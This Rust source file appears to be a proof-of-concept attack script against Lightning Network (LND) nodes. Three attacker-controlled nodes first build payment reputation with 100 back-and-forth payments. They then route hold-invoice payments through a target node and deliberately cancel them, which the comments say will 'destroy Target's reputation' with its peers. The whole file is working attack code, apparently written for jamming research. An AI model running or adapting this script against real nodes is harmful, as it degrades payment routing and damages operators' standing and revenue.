use tokio::time::{sleep, Duration};

mod attack;
mod client;
use std::sync::Arc;

// Alice
const LND_0_RPCSERVER: &str = env!("LND_0_RPCSERVER");
const LND_0_CERT: &str = env!("LND_0_CERT");
const LND_0_MACAROON: &str = env!("LND_0_MACAROON");

// Bob
const LND_1_RPCSERVER: &str = env!("LND_1_RPCSERVER");
const LND_1_CERT: &str = env!("LND_1_CERT");
const LND_1_MACAROON: &str = env!("LND_1_MACAROON");

// Charlie
const LND_2_RPCSERVER: &str = env!("LND_2_RPCSERVER");
const LND_2_CERT: &str = env!("LND_2_CERT");
const LND_2_MACAROON: &str = env!("LND_2_MACAROON");

const TARGET: &str = env!("TARGET");

#[tokio::main]
async fn main() {
    let mut alice = client::new_client(LND_0_RPCSERVER, LND_0_CERT, LND_0_MACAROON)
        .await
        .unwrap();
    let mut bob = client::new_client(LND_1_RPCSERVER, LND_1_CERT, LND_1_MACAROON)
        .await
        .unwrap();

    let mut charlie = client::new_client(LND_2_RPCSERVER, LND_2_CERT, LND_2_MACAROON)
        .await
        .unwrap();

    let target_peers = alice.graph_get_node_peers(TARGET.to_string()).await;

    let front_peer = &target_peers[0];
    let back_peer = &target_peers[1];

    // // have two front-attackers (A & C) open channels to the target
    // attack::open_to_targets(&mut alice, vec![front_peer.clone()])
    //     .await
    //     .unwrap();

    // // The back-attacker (B) opens a channel to the third target
    // attack::open_to_targets(&mut bob, vec![back_peer.clone()])
    //     .await
    //     .unwrap();

    // attack::open_to_targets(&mut charlie, vec![TARGET.to_string()])
    //     .await
    //     .unwrap();

    // println!("Please confirm the channels!");
    // std::io::stdin().read_line(&mut String::new()).unwrap();

    // 1. Alice sends payments to Charlie to build reputation
    println!("100x Alice <-> Charlie payments back and forth");
    for _ in 0..100 {
        let c_invoice = charlie.add_invoice(800_000).await;
        let ac_stream = alice.send_payment(c_invoice.to_string()).await;
        alice
            .on_payment_result(
                ac_stream,
                Arc::new(|_| {
                    // println!("Alice -> Charlie payment success!");
                }),
            )
            .await;

        let a_invoice = alice.add_invoice(800_000).await;
        let ca_stream = charlie.send_payment(a_invoice.to_string()).await;
        charlie
            .on_payment_result(
                ca_stream,
                Arc::new(|_| {
                    // println!("Charlie -> Alice payment success!");
                }),
            )
            .await;
    }

    // 2. Alice sends payments to Bob and fails them to destroy Target's reputation for P1<->P2
    println!("10x Alice -> Bob failed payments");
    let hash_table = client::gen_hash_table(10);
    for (i, (_preimage, payment_hash)) in hash_table.iter().enumerate() {
        let invoice = bob.add_hold_invoice(payment_hash.to_vec(), 1000).await;
        println!("Bob added invoice {}", i + 1);
        // get invoice subscription before payment to avoid missing it.
        let b_stream = bob.get_invoice_subscription().await;

        println!("Alice -> Bob payment attempt {}", i + 1);
        let ab_stream = alice
            .send_payment(invoice.payment_request.to_string())
            .await;

        println!("Bob waiting for invoice accept {}", i + 1);
        bob.await_invoice_accepted(b_stream, payment_hash.to_vec())
            .await;

        println!("Bob Cancelling {}", i + 1);
        bob.cancel_invoice(payment_hash.to_vec()).await;

        alice
            .on_payment_result(
                ab_stream,
                Arc::new(|payment| {
                    if payment.status == 3 {
                        // println!("Alice -> Bob payment failed!");
                    }
                }),
            )
            .await;
    }
}
